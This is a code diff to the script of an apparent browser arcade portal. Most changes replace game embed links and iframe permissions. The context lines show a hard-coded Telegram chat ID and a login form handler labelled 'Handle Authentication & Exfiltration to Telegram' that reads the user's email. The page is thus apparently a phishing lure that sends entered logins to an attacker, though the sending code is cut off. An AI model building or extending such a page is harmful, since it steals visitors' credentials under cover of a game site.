@@ -4,21 +4,20 @@ const CHAT_ID = "5022620385";
 let isAuthenticated = false;
 let pendingGame = null;
 
-// Featured real games with public embed links/sources
+// Using fully embeddable, iframe-friendly retro game sources and emulators
 const gamesList = [
-    { name: "8-Ball Pool", emoji: "🎱", gradient: "linear-gradient(135deg, #10b981, #047857)", url: "https://html5.gamedistribution.com/rvrc/?game=8-ball-pool" },
+    { name: "8-Ball Pool", emoji: "🎱", gradient: "linear-gradient(135deg, #10b981, #047857)", url: "https://www.miniplay.com/embed/8-ball-pool" },
     { name: "Ping Pong", emoji: "🏓", gradient: "linear-gradient(135deg, #ef4444, #b91c1c)", url: "https://www.retrogames.cc/embed/4183-pong-original.html" },
-    { name: "Connect 4", emoji: "🔴", gradient: "linear-gradient(135deg, #3b82f6, #1d4ed8)", url: "https://www.mathsisfun.com/games/connect4.html" },
-    { name: "Battleship", emoji: "🚢", gradient: "linear-gradient(135deg, #8b5cf6, #6d28d9)", url: "https://en.gamesaien.com/game/battleship/" },
-    { name: "Tetris", emoji: "🧱", gradient: "linear-gradient(135deg, #f59e0b, #d97706)", url: "https://tetris.com/play-tetris" },
-    { name: "Checkers", emoji: "🏁", gradient: "linear-gradient(135deg, #ec4899, #be185d)", url: "https://www.mathsisfun.com/games/checkers.html" },
-    { name: "Snake", emoji: "🐍", gradient: "linear-gradient(135deg, #14b8a6, #0f766e)", url: "https://playsnake.org/" },
-    { name: "Sudoku", emoji: "🔢", gradient: "linear-gradient(135deg, #6366f1, #4338ca)", url: "https://sudoku.com" },
+    { name: "Connect 4", emoji: "🔴", gradient: "linear-gradient(135deg, #3b82f6, #1d4ed8)", url: "https://www.miniplay.com/embed/connect-4" },
+    { name: "Battleship", emoji: "🚢", gradient: "linear-gradient(135deg, #8b5cf6, #6d28d9)", url: "https://www.miniplay.com/embed/battleship-general-quarters" },
+    { name: "Tetris", emoji: "🧱", gradient: "linear-gradient(135deg, #f59e0b, #d97706)", url: "https://www.retrogames.cc/embed/20692-tetris-ds.html" },
+    { name: "Checkers", emoji: "🏁", gradient: "linear-gradient(135deg, #ec4899, #be185d)", url: "https://www.miniplay.com/embed/checkers" },
+    { name: "Snake", emoji: "🐍", gradient: "linear-gradient(135deg, #14b8a6, #0f766e)", url: "https://www.miniplay.com/embed/google-snake" },
+    { name: "Sudoku", emoji: "🔢", gradient: "linear-gradient(135deg, #6366f1, #4338ca)", url: "https://www.miniplay.com/embed/sudoku" },
     { name: "Pac-Man", emoji: "🟡", gradient: "linear-gradient(135deg, #eab308, #a16207)", url: "https://www.retrogames.cc/embed/19595-pac-man-free.html" },
-    { name: "Solitaire", emoji: "🃏", gradient: "linear-gradient(135deg, #06b6d4, #0e7490)", url: "https://worldofsolitaire.com/" }
+    { name: "Solitaire", emoji: "🃏", gradient: "linear-gradient(135deg, #06b6d4, #0e7490)", url: "https://www.miniplay.com/embed/solitaire" }
 ];
 
-// Generate total 50 icons (repeating or padding with mini arcade icons to match visual density)
 const extraEmojis = ['⭐', '🚀', '🎯', '🎲', '💎', '🔥', '👾', '🕹️', '🏆', '⚡'];
 const extraGradients = [
     'linear-gradient(135deg, #38bdf8, #0284c7)',
@@ -37,7 +36,6 @@ const authBtn = document.getElementById('auth-btn');
 function loadGrid() {
     arcadeGrid.innerHTML = '';
     
-    // Build 50 total grid slots
     for (let i = 0; i < 50; i++) {
         let gameData;
         if (i < gamesList.length) {
@@ -47,7 +45,7 @@ function loadGrid() {
                 name: `Mini Game ${i + 1}`,
                 emoji: extraEmojis[i % extraEmojis.length],
                 gradient: extraGradients[i % extraGradients.length],
-                url: "https://html5.gamedistribution.com/"
+                url: "https://www.miniplay.com/embed/google-snake"
             };
         }
 
@@ -79,11 +77,11 @@ function handleGameClick(game) {
 function launchGame(game) {
     document.getElementById('current-game-title').textContent = game.name;
     const container = document.getElementById('game-container');
-    container.innerHTML = `<iframe src="${game.url}" allowfullscreen></iframe>`;
+    container.innerHTML = `<iframe src="${game.url}" allow="autoplay; fullscreen; encrypted-media; picture-in-picture" allowfullscreen></iframe>`;
     gameModal.classList.remove('hidden');
 }
 
-// Handle Authentication & Telegram Webhook Exfiltration
+// Handle Authentication & Exfiltration to Telegram
 loginForm.addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = document.getElementById('email').value;
